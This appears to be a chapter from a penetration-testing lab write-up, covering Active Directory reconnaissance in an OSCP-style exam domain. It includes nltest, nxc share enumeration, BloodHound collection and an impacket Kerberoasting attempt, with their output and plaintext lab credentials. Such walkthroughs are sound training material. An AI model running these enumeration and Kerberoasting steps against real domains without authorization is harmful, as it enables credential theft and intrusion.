# 04 — Domain reconnaissance

With MS02 closed on every local axis, the directory becomes the target. This chapter locates the DC,
establishes what a domain user can read, and starts the one attack that does not need privilege:
Kerberoasting.

---

## 4.1 Where the DC is, from inside the domain

```powershell
nltest /dsgetdc:oscp.exam
```

```
           DC: \\DC01.oscp.exam
      Address: \\10.10.152.140
     Dom Guid: e7448cc9-434a-4130-90b0-812d3d0c5a96
     Dom Name: oscp.exam
  Forest Name: oscp.exam
 Dc Site Name: Default-First-Site-Name
Our Site Name: Default-First-Site-Name
        Flags: PDC GC DS LDAP KDC TIMESERV GTIMESERV WRITABLE DNS_DC DNS_DOMAIN
               DNS_FOREST CLOSE_SITE FULL_SECRET WS DS_8 DS_9 DS_10 KEYLIST
```

Three things worth extracting:

**`DC01` is `10.10.152.140`** — routable from Kali directly. No tunnel, no `proxychains`.

**`Dom Guid e7448cc9-…`** matches the GUID recorded on the earlier AD page, where the DC sat at
`10.10.118.146`. Same directory, different address.

**`TIMESERV GTIMESERV`** — the DC advertises itself as a time source. That is a hint about a problem
that shows up in section 4.4, and it also tells you where to point the clock.

---

## 4.2 What a domain user can read on a DC

`eric.wallows` was carried over from the previous leg, and the password still works:

```bash
nxc smb 10.10.152.140 -u eric.wallows -p 'EricLikesRunning800'
nxc smb 10.10.152.140 -u eric.wallows -p 'EricLikesRunning800' --shares
```

```
SMB  10.10.152.140  445  DC01  [*] Windows 10 / Server 2019 Build 17763 x64
                                  (name:DC01) (domain:oscp.exam) (signing:True)
                                  (SMBv1:None) (Null Auth:True)
SMB  10.10.152.140  445  DC01  [+] oscp.exam\eric.wallows:EricLikesRunning800
SMB  10.10.152.140  445  DC01  [*] Enumerated shares
SMB  10.10.152.140  445  DC01      Share           Permissions     Remark
SMB  10.10.152.140  445  DC01      -----           -----------     ------
SMB  10.10.152.140  445  DC01      ADMIN$                          Remote Admin
SMB  10.10.152.140  445  DC01      C$                              Default share
SMB  10.10.152.140  445  DC01      IPC$            READ            Remote IPC
SMB  10.10.152.140  445  DC01      NETLOGON        READ            Logon server share
SMB  10.10.152.140  445  DC01      SYSVOL          READ            Logon server share
SMB  10.10.152.140  445  DC01      Users           READ
```

`NETLOGON`, `SYSVOL` and the blank `ADMIN$`/`C$` are the default picture — every authenticated user
reads the first two and nobody reads the last two without admin. **`Users` is not a default share on a
domain controller.** A custom share holding user data, readable by a plain domain user, is exactly the
kind of thing that leaks a script, a key, or a second credential. It has not been enumerated yet; it is
recorded here as the highest-value unexamined surface.

Note also `signing:True` here against `signing:False` on MS02 — DC01 is hardened on that axis, so relay
work, if any, has to point at MS02.

---

## 4.3 Collecting the directory

```bash
bloodhound-python -d oscp.exam -u celia.almeda -p '7k8XHk3dMtmpnC7' \
  -ns 10.10.152.140 -dc DC01.oscp.exam -c All
```

```
INFO: Found AD domain: oscp.exam
INFO: Getting TGT for user
WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication.
         Error: [Errno Connection error (DC01.oscp.exam:88)]
                [Errno -2] Name or service not known
INFO: Connecting to LDAP server: DC01.oscp.exam
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 3 computers
INFO: Found 31 users
INFO: Found 57 groups
INFO: Found 2 gpos
INFO: Found 6 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: MS01.oscp.exam
INFO: Querying computer: MS02.oscp.exam
INFO: Querying computer: DC01.oscp.exam
INFO: Done in 00M 15S
```

The warning matters as much as the output. `DC01.oscp.exam` does not resolve on this host — Kerberos
needs a name, not an IP, so the collector fell back to NTLM against LDAP. It still produced a graph,
but a thinner one: session and local-group collection came back empty across all three computers
(chapter 05).

The fix is one line and it is the same fix the Kerberoast needs:

```bash
echo '10.10.152.140 DC01.oscp.exam oscp.exam' | sudo tee -a /etc/hosts
```

---

## 4.4 Kerberoasting — and the two things that stopped it

```bash
impacket-GetUserSPNs oscp.exam/celia.almeda:'7k8XHk3dMtmpnC7' \
  -dc-ip 10.10.152.140 -request
```

```
ServicePrincipalName   Name     MemberOf  PasswordLastSet              LastLogon
---------------------  -------  --------  ---------------------------  --------------------------
MSSQL/MS02.oscp.exam   sql_svc            2022-12-05 05:49:44.637096   2022-11-10 03:15:51.783016
HTTP/MS01.oscp.exam    web_svc            2022-11-10 23:11:19.795439   2026-11-22 22:55:09.482611

[-] CCache file is not found. Skipping...
[-] Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
```

The SPN list came back over LDAP — that part worked. The roast itself did not, for two compounding
reasons:

**No TGT.** `CCache file is not found` — `DC01.oscp.exam` does not resolve, so no Kerberos ticket was
ever obtained. Without a TGT, `GetUserSPNs` can enumerate but cannot request service tickets.

**Clock skew.** `KRB_AP_ERR_SKEW` — Kerberos rejects tickets when the client clock is more than five
minutes off the KDC's. This is a VM, and a suspended VM drifts. The DC advertises `TIMESERV GTIMESERV`,
which is both the diagnosis and the remedy:

```bash
sudo ntpdate -u 10.10.152.140
```

Both must be fixed before the roast can run; fixing one alone still fails.

---

## 4.5 The target is `sql_svc`, not `web_svc`

The table names two roastable accounts, and they are not equally useful:

| Account | SPN | Password last set | Value |
|---|---|---|---|
| `sql_svc` | `MSSQL/MS02.oscp.exam` | **2022-12-05** | the MSSQL service account on MS02 — never rotated |
| `web_svc` | `HTTP/MS01.oscp.exam` | 2022-11-10 | already owned: `Diamond1` |

Roasting `web_svc` proves a password we already hold. `sql_svc` is the one that matters, for a reason
that connects straight back to chapter 03: `xp_cmdshell` runs as the SQL service account, and
`sql_svc` is that account. A cracked `sql_svc` is a different security context on MS02 — one that may
carry `SeImpersonatePrivilege`, which neither of our logins does.

A service account whose password has not changed in four years is also just statistically likely to be
weak.

---

## 4.6 Position after this chapter

| Question | Answer |
|---|---|
| DC reachable directly? | **Yes** — `10.10.152.140` |
| Does name resolution work? | **No** — `DC01.oscp.exam` unresolved |
| Does Kerberos work? | **No** — no TGT, and clock skew |
| Kerberoastable accounts | `sql_svc`, `web_svc` |
| Roast completed? | **No** — blocked on DNS + clock |
| Custom DC share found | `Users`, READ as `eric.wallows` |

Two mechanical fixes (a hosts entry and a clock sync) unblock the roast. That is the next action, not a
finding.
